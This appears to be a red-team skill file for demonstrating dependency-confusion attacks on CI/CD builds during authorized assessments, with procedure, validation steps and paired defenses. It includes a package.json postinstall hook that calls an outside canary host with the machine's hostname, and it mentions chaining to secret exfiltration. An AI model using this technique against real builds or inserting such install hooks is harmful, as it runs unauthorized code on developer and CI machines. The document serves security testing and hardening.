---
name: ci-dependency-confusion
description: >-
  Demonstrate dependency confusion / substitution (CICD-SEC-3, dependency-chain
  abuse) during an authorized assessment — getting a build to resolve an
  attacker-published package from a public registry in place of an intended internal
  one. Use when a project references internal/private package names and the build's
  resolver can be tricked into preferring a same-named public package, executing
  attacker code at install time on the developer or CI host.
version: 1.0.0
team: red
app_type: ci-cd
killchain:
  framework: mitre-attack
  stage: initial-access
techniques:
  attack: [T1195.002]
  capec: [CAPEC-538]
  cwe: [CWE-829, CWE-1104]
  owasp: ["A06:2021"]
  d3fend: []
pairs_with: [ci-dependency-integrity-hardening]
risk:
  level: high
  reversible: true
  data_touch: read
authorization: required
maturity: reviewed
license: Apache-2.0
---

# Dependency confusion / substitution

## Overview

Package managers that consult both a private and a public registry can be tricked
into fetching a **public** package that shares the name of an **internal** one —
often preferring the higher version number regardless of source. If an attacker
publishes `@yourorg/internal-lib` (or an unscoped internal name) to the public
registry with a large version, an unhardened build resolves and installs it,
running the package's install hooks as code on the developer's machine or the CI
runner. This skill proves the confusion in a controlled way: it shows the build
*would* resolve the public name, using a benign package that only phones home a
non-sensitive beacon — never a real payload against real infrastructure.

## Authorization & scope

**Run only against builds and internal package names you are authorized to test.**
Publish the proof package to a **registry/namespace you control** (a private test
registry, or a clearly-marked test package on a public registry that you remove
immediately), and make its install hook do nothing but emit an **inert beacon**
(hostname + a canary string to a collaborator) — no data collection, no reverse
shell, no persistence. **Never** publish a package under another organization's real
internal names to the public registry as a live "test"; that risks poisoning real
builds. Remove the test package and restore any lockfile/registry config you
touched.

## Preconditions

- A project that references internal/private package names and a build that resolves
  dependencies from mixed public+private sources.
- A registry/namespace you control to publish the benign proof package, and a
  collaborator host for the inert beacon.

## Procedure

1. **Enumerate internal names.** From manifests and lockfiles (`package.json`,
   `requirements.txt`, `pom.xml`, `*.csproj`), list dependency names that resolve
   internally, and note which are **unscoped** or lack a pinned source.
2. **Check resolver behavior.** Determine whether the build pins each dependency to
   a specific registry/source and whether it prefers the highest version across all
   configured registries — the condition that enables substitution.
3. **Publish a benign proof package.** To a namespace you control, publish a
   same-named test package at a higher version whose install/postinstall hook emits
   only an inert beacon:
   ```json
   { "name": "<internal-name>", "version": "99.0.0",
     "scripts": { "postinstall": "node -e \"require('https').get('https://<canary>.oast.site/dc-'+require('os').hostname())\"" } }
   ```
4. **Resolve in an isolated build.** In a sandboxed checkout, run the install and
   confirm which source the resolver chose — a beacon hit from the CI/dev host
   proves the public package was preferred (install-time code execution).
5. **Assess reach.** Note whether the hook ran on a developer machine, the CI
   runner (with pipeline secrets in scope — chain to `ci-secret-exfiltration`), or
   both.
6. **Record** the confused package, the resolver misconfiguration, where code
   executed, and the fix: scoped names with a pinned/mirrored private source,
   verified lockfiles with integrity hashes, reference/namespace reservation, and
   disabled install scripts for untrusted packages.

## Paired defense / offense

Pairs with **ci-dependency-integrity-hardening**. The beacon and the
higher-version public resolution you produce are exactly what that skill prevents
(source pinning, lockfile integrity, namespace reservation) and detects (unexpected
public resolution of an internal name, install-time network egress).

## Validation

Reproduce in a lab you own with two registries (a private one, e.g. Verdaccio, and
a public-facing test registry):

1. Create a project depending on an internal name served by the private registry.
2. Publish a higher-version benign proof package with the same name to the
   public-facing registry and run the install in a sandbox.
3. Confirm the resolver prefers the public package and the inert beacon fires;
   remove the test package.

## References

- OWASP Top 10 CI/CD Security Risks — CICD-SEC-3 Dependency Chain Abuse
- OWASP: A06:2021 Vulnerable and Outdated Components
- Alex Birsan, "Dependency Confusion" (2021); npm scopes; SLSA; package pinning
- MITRE ATT&CK T1195.002; CAPEC-538; CWE-829, CWE-1104
